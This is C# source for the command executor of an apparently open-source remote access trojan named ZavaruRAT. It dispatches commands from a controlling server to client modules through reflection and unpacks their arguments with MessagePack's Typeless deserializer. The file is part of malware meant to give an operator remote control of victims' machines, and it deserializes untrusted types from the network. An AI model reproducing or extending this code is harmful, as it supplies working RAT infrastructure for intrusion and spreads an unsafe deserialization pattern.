#region

using System.Diagnostics;
using System.Reflection;
using MessagePack;
using ZavaruRAT.Shared;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Client.Sdk;

public sealed class CommandExecutor
{
    private readonly Dictionary<string, MethodInfo> _commands;

    public CommandExecutor()
    {
        _commands = new Dictionary<string, MethodInfo>(StringComparer.InvariantCultureIgnoreCase);
    }

    public CommandExecutor AddModule<T>() where T : ModuleBase
    {
        var moduleType = typeof(T);
        var taskType = typeof(Task<ExecutionResult>);

        foreach (var methodInfo in moduleType.GetMethods())
        {
            if (methodInfo.IsPrivate || methodInfo.ReturnType != taskType)
            {
                continue;
            }

            Debug.WriteLine(methodInfo);
            _commands[methodInfo.Name] = methodInfo;
        }

        Debug.WriteLine("Total methods: {0}", _commands.Count);

        return this;
    }

    public async Task<CommandResult> ExecuteAsync(Command command, ZavaruClient client)
    {
        if (!_commands.TryGetValue(command.CommandName, out var method))
        {
            return new CommandResult
            {
                Status = CommandResultStatus.NotFound
            };
        }

        var ctx = new CommandContext
        {
            Client = client
        };

        ExecutionResult result;
        try
        {
            var module = (ModuleBase)Activator.CreateInstance(method.DeclaringType!)!;
            module.Context = ctx;

            object?[]? args = null;
            if (command.Args != null && command.Args?.Length != 0)
            {
                args = MessagePackSerializer.Typeless.Deserialize(command.Args,
                                                                  ZavaruClient.SerializerOptions) as object
                           ?[];
            }

            var task = (Task<ExecutionResult>)method.Invoke(module, args)!;
            result = await task;
        }
        catch (Exception e)
        {
            Debug.WriteLine("Error while executing command {0}", command.CommandName);
            Debug.WriteLine(e);

            return new CommandResult
            {
                Status = CommandResultStatus.Exception,
                Result = e.ToString()
            };
        }

        return new CommandResult
        {
            Status = CommandResultStatus.Success,
            Result = result.Result
        };
    }
}
